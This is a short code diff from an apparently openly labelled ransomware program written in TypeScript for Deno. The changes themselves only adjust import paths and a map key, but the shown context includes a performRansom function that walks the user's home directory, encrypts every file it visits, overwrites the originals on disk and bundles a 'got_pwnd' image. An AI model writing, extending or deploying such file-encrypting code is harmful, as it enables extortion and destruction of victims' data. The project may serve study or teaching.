@@ -5,14 +5,14 @@ import {
   getHash,
   importPublicKeyFromPem,
   wrapSymmetricKey,
-} from "../../utils/crypto.ts";
+} from "@iw166/utils/crypto";
 import {
   getHomedir,
   getImagePath,
   getMasterkeyPath,
   getNotePath,
   runForFiles,
-} from "../../utils/path_utils.ts";
+} from "@iw166/utils/path";
 import image from "./got_pwnd.png#denoRawImport=bytes.ts" with {
   type: "bytes",
 };
@@ -45,7 +45,7 @@ export async function performRansom() {
   await runForFiles(homedir, hashes, async (entry, hash, data) => {
     const encryptedData = await encryptData(data, symmetricKey, iv);
     const newHash = await getHash(encryptedData);
-    newHashes.set(hash, newHash);
+    newHashes.set(hash.sha1, newHash);
     Deno.writeFileSync(entry.path, new Uint8Array(encryptedData));
     console.log(`Encrypted file with hash ${hash}`);
   });
